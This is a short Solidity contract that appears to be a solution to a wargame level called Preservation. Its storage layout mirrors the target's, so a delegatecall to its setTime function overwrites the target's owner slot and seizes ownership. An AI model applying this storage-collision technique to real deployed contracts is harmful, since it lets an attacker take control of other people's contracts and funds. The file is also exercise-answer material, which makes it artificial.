// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

contract PreservationSolution {
    uint256 slot0;
    uint256 solt1;
    address owner;

    function setTime(uint256 _time) external {
        owner = address(uint160(_time));
    }
}
